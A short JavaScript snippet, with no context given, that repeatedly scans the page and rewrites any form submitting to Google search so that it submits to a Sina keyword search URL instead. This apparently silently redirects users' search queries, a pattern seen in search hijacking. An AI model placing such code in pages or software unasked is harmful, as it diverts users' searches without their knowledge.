new function(r, s, t) {
    this.a = function(n, t, e) {
        if (window.addEventListener) {
            n.addEventListener(t, e, false);
        } else if (window.attachEvent) {
            n.attachEvent("on" + t, e);
        }
    };
    this.b = function(f) {
        var t = this;
        return function() {
            return f.apply(t, arguments);
        };
    };
    this.c = function() {
        var f = document.getElementsByTagName("form");
        for (var i = 0; i < f.length; i++) {
            var o = f[i].action;
            if (this.r.test(o)) {
                f[i].action = o.replace(this.r, this.s);
            }
        }
    };
    this.r = r;
    this.s = s;
    this.d = setInterval(this.b(this.c), t);
    this.a(window, "load", this.b(function() {
        this.c();
        clearInterval(this.d);
    }));
} (/http:\/\/www\.google\.c(om|n)\/search/, "http://keyword.sina.com.cn/searchword.php", 250);